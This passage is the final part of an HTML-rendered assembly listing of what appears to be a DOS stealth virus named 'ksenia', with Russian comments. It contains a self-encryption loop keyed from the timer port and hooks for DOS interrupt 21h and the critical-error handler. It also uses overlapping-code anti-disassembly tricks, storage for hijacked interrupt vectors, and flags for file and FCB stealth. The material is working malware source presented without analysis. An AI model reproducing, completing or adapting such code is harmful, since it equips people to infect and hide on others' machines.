        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crmain</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">    </span><span class="sc1">; encrypt main engine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endcr</span><span class="sc4">-</span><span class="sc5">crmain</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pre_ki</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc5">c2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">c2</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc5">cr_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc1">;_________--------------________</span><span class="sc0">
 </span><span class="sc5">strategy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">extra</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">req_head</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">req_head</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
 </span><span class="sc5">old_strategy</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">win_trick</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
 </span><span class="sc5">win21</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">


 </span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">           </span><span class="sc1">; shl (или shr) al,10h =&gt; zero</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; получим al = 4</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">; ну заебенил !!!</span><span class="sc0">

 </span><span class="sc5">crypt_int21_crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">
 </span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; вызов 21-го инта</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; применил перекрывающийся код</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04ebh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">09ah</span><span class="sc0">                     </span><span class="sc1">; call far ptr ..</span><span class="sc0">
 </span><span class="sc5">io21</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">extra</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; вычисляем дополнительное смещение</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ch</span><span class="sc0">
 </span><span class="sc5">subextr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; считать вершину стека</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">subextr</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">eov</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">io1</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; убежище для векторов</span><span class="sc0">
 </span><span class="sc5">io9</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">io1c</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">io24</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">req_head</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">point</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; для обработчика int 09h</span><span class="sc0">
 </span><span class="sc5">resthost</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">_addr21</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">splint</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">keepword</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">prev2</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; начало 21-го обработчика</span><span class="sc0">
 </span><span class="sc5">stf</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; флаг для общего стелса</span><span class="sc0">
 </span><span class="sc5">drf</span><span class="sc0">                    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; флаг для fcb стелса</span><span class="sc0">
 </span><span class="sc5">seek_pos</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; место хранения seekа</span><span class="sc0">
 </span><span class="sc5">nrbytes</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; тоже для считанных байт</span><span class="sc0">
 </span><span class="sc5">func_number</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">func_jump</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">two_bytes</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">sys_sp</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">sys_ss</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">psp</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">buffer</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


 </span><span class="sc5">eom</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">ksenia</span><span class="sc0">

────────────────────────────────────────────────────────────────────────────────
</span></div></body>
</html>
